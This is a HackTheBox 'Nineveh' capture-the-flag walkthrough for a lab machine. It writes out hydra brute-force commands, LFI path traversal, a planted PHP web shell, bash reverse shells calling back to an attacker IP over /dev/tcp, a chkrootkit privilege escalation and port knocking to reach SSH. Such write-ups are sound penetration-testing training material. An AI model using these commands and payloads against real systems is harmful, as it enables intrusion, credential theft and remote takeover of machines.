# HackTheBox Nineveh

> Author: Hades

> [*Scripting here*](https://github.com/leecybersec/scripting)

![](images/1.png)

## Information Gathering

### Openning Services

```
### Port Scanning ############################
nmap -sS -p- --min-rate 1000 10.10.10.43

[+] Openning ports: 80,443

### Services Enumeration ############################
nmap -sC -sV -Pn 10.10.10.43 -p80,443
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 12:44 +07
Nmap scan report for 10.10.10.43
Host is up (0.28s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.22 seconds
```

### Web Application 80

It is a default web page.

![](images/2.png)

List of the hidden in the server using `gobuster`.

```
### Web Enumeration (80) ############################
+] Files and directories
gobuster dir -k -u http://10.10.10.43:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
<snip>
===============================================================
/department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
```

Login page at `/department`.

![](images/5.png)

I enum more hidden file in uri `/department` but there are no interested file.

Try to brute force username password with hydra using `rockyou.txt` directory.

```
┌──(Hades㉿10.10.14.5)-[1.9:26.2]~/scripting
└─$ hydra -l admin -P /home/kali/directory/rockyou.txt 10.10.10.43 http-post-form '/department/login.php:username=admin&password=^PASS^:Invalid Password!'
<snip>
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
```

After login to department with `admin:1q2w3e4r5t`, I have a note at the url `http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt`

![](images/6.png)

### Web Application 443

Fist in the web, I saw an image here.

![](images/3.png)

Based on nmap result, port 443 have domain `commonName=nineveh.htb`. I add it to `/etc/host` and go to this site again, but it return the same page.

Using `gobuster` to list hidden in the website, I have uri `/db`.

```
[+] Files and directories
gobuster dir -k -u https://10.10.10.43:443 -w /usr/share/seclists/Discovery/Web-Content/common.txt
<snip>
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/db                   (Status: 301) [Size: 309] [--> https://10.10.10.43/db/]
```

phpLiteAdmin 1.9 at `/db`.

![](images/4.png)

Try to brute force phpLiteAdmin password with hydra using `rockyou.txt` directory.

```
┌──(Hades㉿10.10.14.5)-[1.9:32.3]~
└─$ hydra -l admin -P /home/kali/directory/rockyou.txt 10.10.10.43 https-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.'
<snip>
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
```

Search the public exploit with `searchsploit`.

```
┌──(Hades㉿10.10.14.5)-[1.9:25.1]~/scripting
└─$ searchsploit phpLiteAdmin 1.9
-------------------------------------------- ---------------------------------
 Exploit Title                              |  Path
-------------------------------------------- ---------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Inject | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabiliti | php/webapps/39714.txt
-------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Foothold

### LFI within filtering

[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/nineveh)

At url `http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt`, I saw this url query `ninevehNotes.txt` file, try to check it with Local file inclusion.

With only enough `/../` in the url and content file name `ninevehNotes`, the LFI vulnerability will work.

![](images/9.png)

Try read some other sensitive file, I got the result `File name too long.`.

+ We need have a backdoor with the length long enough.

+ The file name must contain name `ninevehNotes`.

### PHP Code Injection

Using exploit at `php/webapps/24044.txt`, I create 1 database named `ninevehNotes.php`.

![](images/7.png)

Create new table name `<?php system($_REQUEST['cmd'])?>`.

![](images/8.png)

The database at `/var/tmp/ninevehNotes.php` contain php execute code have been created. Now I have a backdoor `ninevehNotes.php`.

![](images/10.png)

### PHP Backdoor

Back to LFI vulnerability, I execute the backdoor with command `id` to confirm it.

```
http://nineveh.htb/department/manage.php?notes=../../../../../var/tmp/ninevehNotes.php&cmd=id
```

![](images/11.png)

Step to gain reverse shell.

Url encode using hURL

```
┌──(Hades㉿10.10.14.5)-[2.0:28.4]~
└─$ hURL -U "bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'"

Original    :: bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
URL ENcoded :: bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F443%200%3E%261%27
```

Execute bash reverse shell at backdoor `ninevehNotes.php`

```
┌──(Hades㉿10.10.14.5)-[2.0:28.4]~
└─$ cmd='bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F443%200%3E%261%27'
```

```
┌──(Hades㉿10.10.14.5)-[2.0:28.3]~
└─$ curl --silent --cookie "PHPSESSID=qe89kahpkithaplfechcptbjt5" "http://nineveh.htb/department/manage.php?notes=../../../../../var/tmp/ninevehNotes.php&cmd=$cmd" > /dev/null
```

Reverse shell at listener.

```
┌──(Hades㉿10.10.14.5)-[2.0:28.4]~
└─$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.43] 37498
bash: cannot set terminal process group (1390): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@nineveh:/var/www/html/department$
```

## Privilege Escalation

### Chkrootkit Local PriEscal

[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/nineveh)

I use script `procmon.sh` to check the scheduled tasks in the system.

```
www-data@nineveh:/tmp$ bash procmon.sh
< sleep 1
> sleep 1
> /usr/sbin/CRON -f
> /bin/sh -c /root/vulnScan.sh
> /bin/bash /root/vulnScan.sh
> /bin/sh /usr/bin/chkrootkit
> find /lib /usr/lib /usr/local/lib -name libproc.a
```

There are command `chkrootkit` may have the vulnerable, find public exploit using `searchsploit`.

```
┌──(Hades㉿10.10.14.5)-[2.5:27.0]~
└─$ searchsploit chkrootkit
------------------------------------------------------ ---------------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)  | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation          | linux/local/33899.txt
------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Follow exploit `linux/local/33899.txt`, I create reverse bash shell in file `/tmp/update` and add execute permission.

```
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'" > /tmp/update; chmod +x /tmp/update
```

At the listener, I have root shell.

```
┌──(Hades㉿10.10.14.5)-[2.6:25.5]~
└─$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.43] 56490
bash: cannot set terminal process group (27001): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# whoami
whoami
root
```

### Steganography and Knockd

[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/nineveh)

Follow note `check your serect folder to get in! figure it out! this is your challenge` and check out www folder, I saw `ssl` folder.

```
www-data@nineveh:/var/www$ ls
cd  html  ssl
```

Go to `ssl` and there is an `secure_notes` contain image `nineveh.png`.

```
www-data@nineveh:/var/www/ssl$ ls secure_notes/
index.html  nineveh.png
www-data@nineveh:/var/www/ssl$ ls /home
amrois
```

May admin used some steganography to hidden text and challenge user amrois to figure it out.

I download image `nineveh.png` and using `strings` to list text on it.

```
┌──(Hades㉿10.10.14.5)-[2.2:31.2]~/walkthrough/hackthebox/nineveh
└─$ strings nineveh.png
www-data
secret/nineveh.priv

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
<snip>
```

Now, I have the private key, but at the openning services scanned when I gather infomation, port 22 is not open. Let's have a local enum opening ports.

```
www-data@nineveh:/tmp$ netstat -antup
<snip>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -               
<snip>
```

Port 22 is openning in the server, but iptables allow only port 80 and 443.

```
www-data@nineveh:/tmp$ cat /etc/iptables/rules.v4
<snip>
-A INPUT -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 443 -j ACCEPT
-A INPUT -j DROP
COMMIT
# Completed on Sun Jul  2 19:37:15 2017
```

Using command `find` to find knockd file config.

```
www-data@nineveh:/etc$ find / -name *knockd* 2>/dev/null
find / -name *knockd* 2>/dev/null
/etc/knockd.conf
```

```
www-data@nineveh:/etc$ cat /etc/knockd.conf
cat /etc/knockd.conf
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

Let's knock number of port to make iptables allow port 22.

```
┌──(Hades㉿10.10.14.5)-[2.6:24.9]~
└─$ knock 10.10.10.43 571 290 911
```

Using `nmap` checking port 22 is open.

```
┌──(Hades㉿10.10.14.5)-[2.6:25.8]~
└─$ nmap -p 22 10.10.10.43                          
<snip>

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds
```

Using private key to ssh to the server.

```
┌──(Hades㉿10.10.14.5)-[2.6:25.5]~/walkthrough/hackthebox/nineveh
└─$ ssh -i nineveh.priv amrois@10.10.10.43
<snip>
You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ id
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
```